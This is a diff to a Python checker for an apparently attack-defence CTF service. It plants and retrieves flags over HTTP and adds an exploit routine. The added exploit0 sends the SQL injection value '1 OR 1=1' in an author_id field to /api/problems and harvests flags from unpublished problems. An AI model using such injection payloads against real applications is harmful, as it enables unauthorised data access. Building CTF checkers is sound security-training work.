@@ -48,33 +48,29 @@ class Connection:
         self.logger = logger
 
     async def register_user(self, username: str, password: str):
-        self.logger.debug(
-            f"Sending command to register user: {username} with password: {password}"
-        )
         response = await self.client.post(
             "/register",
             data={"username": username, "password": password}
         )
-        data = await response.json()
+        data = response.json()
         
         if data.get("success") == False or response.status_code not in [200, 201, 302]:
             raise MumbleException("Failed to register user")
 
     async def login_user(self, username: str, password: str):
-        self.logger.debug(f"Sending command to login.")
         response = await self.client.post(
             "/login",
             data={"username": username, "password": password}
         )
-        data = await response.json()
+        data = response.json()
         
         if data.get("success") == False or response.status_code not in [200, 201, 302]:
             raise MumbleException("Failed to log in!")
 
 
 @checker.register_dependency
-def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
-    return Connection(logger, socket)
+def _get_connection(client: AsyncClient, logger: LoggerAdapter) -> Connection:
+    return Connection(logger, client)
 
 
 """
@@ -96,8 +92,6 @@ async def putflag_drafts(
         random.choices(string.ascii_uppercase + string.digits, k=12)
     )
 
-    logger.debug(f"Connecting to service")
-
     await conn.register_user(username, password)
 
     await conn.login_user(username, password)
@@ -106,7 +100,6 @@ async def putflag_drafts(
         random.choices(string.ascii_uppercase + string.digits, k=12)
     )
     
-    logger.debug(f"Posting flag with title: {problem_title}")
     try: 
         headers = {"Accept": "application/json"}
         response = await conn.client.post(
@@ -124,7 +117,7 @@ async def putflag_drafts(
             }
         )
         
-        data = await response.json()
+        data = response.json()
         
         if response.status_code != 200 or not data.get("success"):
             error_msg = data.get("message", "Unknown error")
@@ -133,14 +126,11 @@ async def putflag_drafts(
         problem_id = data.get("problem_id")
         if not problem_id:
             raise MumbleException("No problem ID in response")
-            
-        logger.debug(f"Created problem with ID: {problem_id}")
         
         # Store the username, password, and problem ID
         await db.set("userdata", (username, password, problem_id))
         
     except Exception as ex:
-        logger.debug(f"Failed to post flag: {ex}")
         raise MumbleException(f"Error posting flag: {ex}")
         
     return username
@@ -148,32 +138,27 @@ async def putflag_drafts(
 
 @checker.getflag(0)
 async def getflag_note(
-    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
+    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
 ) -> None:
     try:
         username, password, problem_id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
+    
+    conn = Connection(logger, client)
 
-    logger.debug(f"Connecting to the service")
-
-    # Let's login to the service
     await conn.login_user(username, password)
 
-    # Let's obtain our problem
-    logger.debug(f"Retrieving problem with ID: {problem_id}")
     response = await conn.client.get(f"/problems/details/{problem_id}")
     
     if response.status_code != 200:
         raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
     
-    content = await response.text()
+    content = response.text
     
     # Check if flag is in the response
     if task.flag not in content:
         raise MumbleException("Flag was not found in the problem content")
-    
-    logger.debug("Flag successfully retrieved")
 
 
 # @checker.putnoise(0)
@@ -207,7 +192,7 @@ async def getflag_note(
 #     try:
 #         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
 #     except Exception as ex:
-#         logger.debug(f"Failed to retrieve note: {ex}")
+#         logger.i(f"Failed to retrieve note: {ex}")
 #         raise MumbleException("Could not retrieve NoteId")
 
 #     assert_equals(len(noteId) > 0, True, message="Empty noteId received")
@@ -345,15 +330,39 @@ async def getflag_note(
 #     if not noteId.encode() in data:
 #         raise MumbleException("List command does not work as intended")
 
-# @checker.exploit(0)
-# async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-#     welcome = await conn.reader.readuntil(b">")
-#     conn.writer.write(b"dump\nexit\n")
-#     await conn.writer.drain()
-#     data = await conn.reader.read(-1)
-#     if flag := searcher.search_flag(data):
-#         return flag
-#     raise MumbleException("flag not found")
+@checker.exploit(0)
+async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
+    username: str = "checker_" + "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    password: str = "checker_" + "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+
+    conn = Connection(logger, client)
+    await conn.register_user(username, password)
+    await conn.login_user(username, password)
+
+    response = await conn.client.post(
+        "/api/problems",
+        data={"author_id": "1 OR 1=1"} # SQL injection to get all problems
+    )
+    
+    if response.status_code not in [200, 201, 302]:
+        logger.debug(f"Failed to exploit service: HTTP {response.status_code, response.text}")
+        raise MumbleException(f"Failed to exploit service: HTTP {response.status_code}")
+    
+    logger.debug(f"Exploit response: {response.text}")
+    data = response.json()
+    logger.debug(f"Exploit response: {data}")
+    
+    for problem in data:
+        if not problem.get("is_published", False):
+            description = problem.get("description", "")
+            if flag := searcher.search_flag(description):
+                return flag
+    
+    raise MumbleException("No flag found in any problem description")
 
 # @checker.exploit(1)
 # async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
